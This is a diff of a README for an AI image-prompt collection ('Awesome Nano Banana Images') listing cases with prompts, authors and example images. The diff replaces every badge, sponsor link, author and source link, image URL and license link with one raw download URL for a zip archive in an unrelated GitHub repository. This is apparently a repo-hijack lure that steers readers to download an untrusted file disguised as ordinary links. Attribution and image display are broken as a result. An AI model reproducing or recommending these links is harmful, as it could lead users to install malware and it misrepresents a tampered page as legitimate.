@@ -1,11 +1,11 @@
 <a id="readme-top"></a>
 # Awesome 🍌 Nano Banana Images ✨
 
-[![License: CC BY 4.0](https://img.shields.io/badge/License-CC_BY_4.0-lightgrey.svg)](LICENSE)
-[![English](https://img.shields.io/badge/English-Click-yellow)](README_en.md)
-[![简体中文](https://img.shields.io/badge/简体中文-点击查看-orange)](README.md)
-<a href="https://github.com/JimmyLv/awesome-nano-banana/stargazers">
-  <img src="https://img.shields.io/github/stars/JimmyLv/awesome-nano-banana?style=social" alt="GitHub stars">
+[![License: CC BY 4.0](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)](LICENSE)
+[![English](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+[![简体中文](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip简体中文-点击查看-orange)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+<a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">
+  <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" alt="GitHub stars">
 </a>
 
 🎉 Welcome to 🍌 Nano Banana Image Collection!
@@ -18,9 +18,9 @@ Cases mainly come from Twitter/X 🐦 and various AI communities 🎬. May these
 
 ## Sponsors
 
-💡 **Recommended Tool**: Want to quickly experience various AI image generation models? We recommend using the [chatimg.ai](https://chatimg.ai) website, which supports mainstream models like GPT-4o, Gemini, Flux, Grok and more for image generation, provides numerous beautiful templates, and supports custom prompt creation!
+💡 **Recommended Tool**: Want to quickly experience various AI image generation models? We recommend using the [https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) website, which supports mainstream models like GPT-4o, Gemini, Flux, Grok and more for image generation, provides numerous beautiful templates, and supports custom prompt creation!
 
-<img src="https://supermaker.ai/icon/favicon-96x96.png" width="16" alt="Free Nano Banana AI Logo"> [Free Nano Banana AI](https://supermaker.ai/image/nano-banana/) Edit Photos with Text or Image | SuperMaker AI
+<img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="16" alt="Free Nano Banana AI Logo"> [Free Nano Banana AI](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) Edit Photos with Text or Image | SuperMaker AI
 
 
 ---
@@ -187,14 +187,14 @@ GPT‑4o is a multimodal model that not only turns text prompts into high‑qual
 ## 🧩 Case
 
 <a id="cases-100"></a>
-### Case 100: Creative Ad with Real Object and Hand-Drawn Doodle (by [@azed_ai](https://x.com/azed_ai))
+### Case 100: Creative Ad with Real Object and Hand-Drawn Doodle (by [@azed_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/azed_ai/status/1923016036120658122)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-Bt055iW47OUqRDOh-K0gZ.png?v=1" width="300" alt="Art Style: 实物与手绘涂鸦创意广告 (Gemini Example 100) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/100/creative-ad-real-object-hand-drawn-doodle.png" width="300" alt="Art Style: 实物与手绘涂鸦创意广告 (Gemini Example 100) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/azed_ai">@azed_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 实物与手绘涂鸦创意广告 (Gemini Example 100) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 实物与手绘涂鸦创意广告 (Gemini Example 100) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@azed_ai</a></sub>
 
 **Prompt**
 
@@ -217,14 +217,14 @@ For example:
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-99"></a>
-### Case 99: Black and White Portrait Art (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 99: Black and White Portrait Art (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1922150692145283299)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-ameZsuCqj7Px_1-NLwLhj.png?v=1" width="300" alt="Art Style: 黑白肖像艺术 (Gemini Example 99) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/99/harry-potter-black-white-portrait-art.png" width="300" alt="Art Style: 黑白肖像艺术 (Gemini Example 99) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 黑白肖像艺术 (Gemini Example 99) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 黑白肖像艺术 (Gemini Example 99) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -246,14 +246,14 @@ The overall atmosphere is abstract yet deeply human, like a fleeting glance or a
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-98"></a>
-### Case 98: Blurred Silhouette Behind Frosted Glass (by [@umesh_ai](https://x.com/umesh_ai))
+### Case 98: Blurred Silhouette Behind Frosted Glass (by [@umesh_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/umesh_ai/status/1921487841634156999)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-pDsaB4o_oiNIjud_j5ypp.png?v=1" width="300" alt="Art Style: 磨砂玻璃后的虚实对比剪影 (Gemini Example 98) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/98/blurred-silhouette-frosted-glass.png" width="300" alt="Art Style: 磨砂玻璃后的虚实对比剪影 (Gemini Example 98) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/umesh_ai">@umesh_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 磨砂玻璃后的虚实对比剪影 (Gemini Example 98) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 磨砂玻璃后的虚实对比剪影 (Gemini Example 98) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@umesh_ai</a></sub>
 
 **Prompt**
 
@@ -271,14 +271,14 @@ For example, set [SUBJECT] to “a Sith Lord wielding a red lightsaber in one ha
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-97"></a>
-### Case 97: Cute and Cozy Knitted Doll (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 97: Cute and Cozy Knitted Doll (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1921148024861938077)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-FpVTUFWK2dhd1GSysOFdh.png?v=1" width="300" alt="Character: 可爱温馨针织玩偶 (Gemini Example 97) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/97/cute_cozy_knitted_doll.png" width="300" alt="Character: 可爱温馨针织玩偶 (Gemini Example 97) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 可爱温馨针织玩偶 (Gemini Example 97) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 可爱温馨针织玩偶 (Gemini Example 97) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -295,14 +295,14 @@ A close-up, professionally composed photograph showcasing a hand-crocheted yarn 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-96"></a>
-### Case 96: Custom Anime Figure (by [@dotey](https://x.com/dotey))
+### Case 96: Custom Anime Figure (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1920851135516082246)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-qVK6fm-fP8a4-LxpaN7Ji.png?v=1" width="300" alt="Character: 定制动漫手办 (Gemini Example 96) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/96/custom-anime-figure-from-photo.png" width="300" alt="Character: 定制动漫手办 (Gemini Example 96) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 定制动漫手办 (Gemini Example 96) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 定制动漫手办 (Gemini Example 96) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -319,14 +319,14 @@ Generate an anime-style figure photo placed on a desktop, presented from a casua
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-95"></a>
-### Case 95: Bobblehead Generator from Selfie (by [@thisdudelikesAI](https://x.com/thisdudelikesAI))
+### Case 95: Bobblehead Generator from Selfie (by [@thisdudelikesAI](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/thisdudelikesAI/status/1920433372243136730)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-eJzwap7e7KsSwJofY3ij8.png?v=1" width="300" alt="自拍生成摇头娃娃 (Gemini Example 95) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/95/selfie-to-bobblehead-generator.png" width="300" alt="自拍生成摇头娃娃 (Gemini Example 95) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/thisdudelikesAI">@thisdudelikesAI</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="自拍生成摇头娃娃 (Gemini Example 95) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="自拍生成摇头娃娃 (Gemini Example 95) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@thisdudelikesAI</a></sub>
 
 **Prompt**
 
@@ -344,14 +344,14 @@ Turn this photo into a bobblehead: enlarge the head slightly, keep the face accu
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-94"></a>
-### Case 94: Three Animals Selfie at Landmark (by [@berryxia_ai](https://x.com/berryxia_ai))
+### Case 94: Three Animals Selfie at Landmark (by [@berryxia_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/berryxia_ai/status/1920795648946782583)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-yAd6PqQMt86VX6Nh1QFCl.png?v=1" width="300" alt="Art Style: 三只动物与地标自拍 (Gemini Example 94) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/94/three_animals_selfie_at_landmark.png" width="300" alt="Art Style: 三只动物与地标自拍 (Gemini Example 94) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/berryxia_ai">@berryxia_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 三只动物与地标自拍 (Gemini Example 94) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 三只动物与地标自拍 (Gemini Example 94) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@berryxia_ai</a></sub>
 
 **Prompt**
 
@@ -368,14 +368,14 @@ A close-up selfie of three [animal type] with different expressions in front of 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-93"></a>
-### Case 93: Glass Retexturing (by [@egeberkina](https://x.com/egeberkina))
+### Case 93: Glass Retexturing (by [@egeberkina](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/egeberkina/status/1920448389960909085)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-QCdSAN2IyigyHVVplpXGL.png?v=1" width="300" alt="玻璃质感重塑 (Gemini Example 93) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/93/glass_retexturing.png" width="300" alt="玻璃质感重塑 (Gemini Example 93) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/egeberkina">@egeberkina</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="玻璃质感重塑 (Gemini Example 93) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="玻璃质感重塑 (Gemini Example 93) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@egeberkina</a></sub>
 
 **Prompt**
 
@@ -425,14 +425,14 @@ retexture the image attached based on the JSON aesthetic below
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-92"></a>
-### Case 92: Perspective 3D Pop-Out Effect (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 92: Perspective 3D Pop-Out Effect (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1920355982703509588)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-ZwX4XJBz5BqMcvOXYcen0.png?v=1" width="300" alt="Object: 透视3D出屏效果 (Gemini Example 92) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/92/perspective-3d-pop-out-effect.png" width="300" alt="Object: 透视3D出屏效果 (Gemini Example 92) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 透视3D出屏效果 (Gemini Example 92) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 透视3D出屏效果 (Gemini Example 92) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -442,7 +442,7 @@ Hyperrealistic, top-down bird's-eye view shot, a beautiful Instagram model [Anne
 
 *Note: You can replace [Anne Hathaway] in the prompt with other character names. Or use a photo of a person as a reference image.*
 
-**Reference Image Required:** You can use a photo of a person as a reference image. This example image uses ["Girl with a Pearl Earring"](https://commons.wikimedia.org/w/index.php?curid=55017931) as a reference image.
+**Reference Image Required:** You can use a photo of a person as a reference image. This example image uses ["Girl with a Pearl Earring"](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) as a reference image.
 
 
 ---
@@ -450,14 +450,14 @@ Hyperrealistic, top-down bird's-eye view shot, a beautiful Instagram model [Anne
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-91"></a>
-### Case 91: Google Maps to Ancient Treasure Map (by [@umesh_ai](https://x.com/umesh_ai))
+### Case 91: Google Maps to Ancient Treasure Map (by [@umesh_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/umesh_ai/status/1919701229363466328)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-jPX65pFLBMTvzVaCgSjlz.png?v=1" width="300" alt="Art Style: 谷歌地图变身古代藏宝图 (Gemini Example 91) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/91/case.png" width="300" alt="Art Style: 谷歌地图变身古代藏宝图 (Gemini Example 91) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/umesh_ai">@umesh_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 谷歌地图变身古代藏宝图 (Gemini Example 91) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 谷歌地图变身古代藏宝图 (Gemini Example 91) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@umesh_ai</a></sub>
 
 **Prompt**
 
@@ -474,14 +474,14 @@ Transform the image to an ancient treasure map drawn on aged parchment. The map 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-90"></a>
-### Case 90: Branded Mechanical Keycaps (by [@egeberkina](https://x.com/egeberkina))
+### Case 90: Branded Mechanical Keycaps (by [@egeberkina](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/egeberkina/status/1918291652210311278)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-q-57zaITSb7d5Y21Ya6Rk.png?v=1" width="300" alt="Object: 品牌化键盘键帽 (Gemini Example 90) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/90/case.png" width="300" alt="Object: 品牌化键盘键帽 (Gemini Example 90) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/egeberkina">@egeberkina</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 品牌化键盘键帽 (Gemini Example 90) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 品牌化键盘键帽 (Gemini Example 90) - GPT-4o"> |
